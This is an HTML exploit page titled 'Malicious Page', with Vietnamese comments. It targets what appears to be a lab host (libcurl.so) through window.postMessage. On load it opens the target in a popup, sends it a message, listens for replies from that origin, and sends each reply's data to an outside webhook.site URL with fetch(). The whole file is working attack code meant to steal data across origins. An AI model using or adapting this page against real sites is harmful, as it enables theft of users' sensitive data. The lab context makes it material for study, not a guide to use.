<!DOCTYPE html>
<html>
<head>
  <title>Malicious Page</title>
  <script>
    function receiveMessage(event) {
      // Kiểm tra nếu thông điệp đến từ trang bị ảnh hưởng
      if (event.origin !== 'http://ptl-c1cb5798-5d605bfc.libcurl.so') {
        return;
      }

      // Lấy dữ liệu từ thông điệp
      var data = event.data;

      // Gửi dữ liệu nhạy cảm về server của bạn
      fetch("https://webhook.site/4314bf30-5ce3-4919-a7ea-d88e77b2eb85/?data=" + encodeURIComponent(data));
    }

    // Thêm listener để nhận thông điệp
    window.addEventListener('message', receiveMessage, false);

    // Mở trang bị ảnh hưởng
    function openVulnerablePage() {
      var popup = window.open('http://ptl-c1cb5798-5d605bfc.libcurl.so/key/0', 'vulnerablePage', 'width=800,height=600');

      // Đợi cho trang popup tải xong và gửi thông điệp
      popup.onload = function() {
        popup.postMessage('Hello from malicious page', 'http://ptl-c1cb5798-5d605bfc.libcurl.so');
      };
    }
  </script>
</head>
<body onload="openVulnerablePage()">
  <h1>Malicious Page</h1>
</body>
</html>
